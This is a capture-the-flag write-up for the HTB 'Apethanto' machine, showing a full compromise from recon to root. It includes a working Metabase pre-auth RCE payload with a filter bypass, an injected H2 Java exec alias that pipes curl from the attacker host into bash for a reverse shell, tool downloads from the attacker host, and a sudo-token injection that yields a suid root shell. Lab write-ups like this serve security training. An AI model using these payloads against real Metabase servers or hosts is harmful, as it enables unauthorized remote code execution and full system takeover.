# Write-up for HTB Uni-CTF-2023

**Name of Challenge** - Apethanto  
**Category** - Fullpwn

```console
inte@debian-pc:~$ sudo nmap -p- --min-rate 4000 10.129.248.227
Nmap scan report for 10.129.248.227
Host is up (0.13s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

```console
inte@debian-pc:~$ sudo nmap -sC -sV -p 22,80,3000 -oN apethanto.nmap 10.129.248.227
Nmap scan report for 10.129.248.227
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://apethanto.htb/
|_http-server-header: nginx/1.18.0
3000/tcp open  http    Jetty 11.0.14
|_http-title: Metabase
|_http-server-header: Jetty(11.0.14)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Based on `nmap` report, `/etc/hosts` has to be updated.

```text
10.129.248.88 apethanto.htb
```

<http://apethanto.htb/> is static.  
The URL <http://metabase.apethanto.htb/> is present on homepage; add it to `/etc/hosts`:

```text
10.129.248.88 apethanto.htb metabase.apethanto.htb
```

<http://metabase.apethanto.htb/> is running an instance of Metabase, same as <http://apethanto.htb:3000>  
Recent Metabase CVE vulnerability with pre-auth RCE: <https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/>  
From <http://metabase.apethanto.htb/api/session/properties> the version was found to be v0.46.6 (vulnerable).  
The `setup-token`: `819139a8-1ce9-46f0-acf8-9b4fc0d1164b` could also be found.

The vulnerability's public PoCs are ineffective. The instance has possibly been configured with slight variations from defaults.  
The Assetnote blog hints to other approaches which could work.  
I wrote another PoC based on existing ones and after several minutes of debugging, an alternate approach worked for RCE.

The key ideas:

- Using a `mem` DB instead of the zip URI as mentioned in <https://blog.calif.io/p/reproducing-cve-2023-38646-metabase>
- Using the diacritic character `ı` instead of `I` to bypass filter (<https://twitter.com/reginaldojsf/status/1684728514170191872>)
- Fixing the java errors as stated in JDBC responses

The H2 database query:

```text
mem:;ıNIT=RUNSCRIPT FROM 'http://10.10.14.80:8000/poc.sql'//\;
```

Queries in `poc.sql`:

```text
"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {{Runtime.getRuntime().exec(cmd);return \"a\";}}';CALL EXEC ('bash -c {{curl,{lhost}:{lport}/payload}}|{{bash,-i}}')"
```

`payload` is a bash reverse shell one-liner.

**Note**: Above queries have extraneous `\` or `{{` for escaping quotes in JSON or other characters within Python f-strings.  
As a result, the provided payloads would not work when used with `curl` or `BurpSuite` without adjustments.

Full exploit script: [metabase_preauth_rce.py](metabase_preauth_rce.py)

```console
inte@debian-pc:~$ python3 metabase_preauth_rce.py
LHOST: 10.10.14.80
Version: {'date': '2023-06-29', 'tag': 'v0.46.6', 'branch': 'release-x.46.x', 'hash': '1bb88f5'}
Token: 819139a8-1ce9-46f0-acf8-9b4fc0d1164b
10.129.248.88 - - [10/Dec/2023 16:51:02] "GET /poc.sql HTTP/1.1" 200 -

10.129.248.88 - - [10/Dec/2023 16:51:04] "GET /payload HTTP/1.1" 200 -
```

After receiving the reverse shell, upgrade it:

```console
metabase@Apethanto:~$ python3 -c 'import pty;pty.spawn("/bin/bash");'
metabase@Apethanto:~$ ^Z
inte@debian-pc:~$ stty raw -echo; fg
metabase@Apethanto:~$ stty rows 24 cols 80
metabase@Apethanto:~$ export TERM=xterm-256color
metabase@Apethanto:~$ exec /bin/bash
```

```console
metabase@Apethanto:~$ id
uid=998(metabase) gid=998(metabase) groups=998(metabase),27(sudo)
```

Being a member of the `sudo` group grants the ability to execute any OS command as root. However, the user's password is not known.

[pspy](https://github.com/DominicBreuker/pspy) can be used to monitor cron jobs.

```text
2023/12/10 11:25:46 CMD: UID=0     PID=3677   | sudo -u metabase -i 
2023/12/10 11:25:46 CMD: UID=998   PID=3678   | -bash 
2023/12/10 11:25:46 CMD: UID=998   PID=3679   | -bash 
2023/12/10 11:25:46 CMD: UID=998   PID=3680   | 
2023/12/10 11:25:46 CMD: UID=0     PID=3681   | sudo apt update 
2023/12/10 11:25:46 CMD: UID=0     PID=3682   | apt update 
```

A root cron job is running `sudo apt update` as user `metabase`.  
This scenario matches the one mentioned in <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens>  
A shell as user with `sudo` privileges is available, password is unknown, and another session is running a command as the same user with `sudo`.

```console
metabase@Apethanto:~$ cat /proc/sys/kernel/yama/ptrace_scope
0
metabase@Apethanto:~$ which gdb
/usr/bin/gdb
```

Therefore, [sudo_inject](https://github.com/nongiach/sudo_inject) can be used:

```console
metabase@Apethanto:~$ wget 10.10.14.80:8000/activate_sudo_token
metabase@Apethanto:~$ wget 10.10.14.80:8000/exploit_v2.sh
metabase@Apethanto:~$ chmod +x exploit_v2.sh 
metabase@Apethanto:~$ sudo bash
[sudo] password for metabase: 
sudo: a password is required
metabase@Apethanto:~$ ./exploit_v2.sh 
Creating suid shell in /tmp/sh
Current process : 1228
Injecting process 798 -> bash
Injecting process 801 -> bash
Injecting process 803 -> bash
Injecting process 804 -> bash
Injecting process 809 -> bash
Injecting process 1207 -> bash
```

The suid `sh` created in `/tmp` can be used to get shell as root:

```console
metabase@Apethanto:~$ /tmp/sh -p
# id
uid=998(metabase) gid=998(metabase) euid=0(root) egid=0(root) groups=0(root),27(sudo),998(metabase)
```
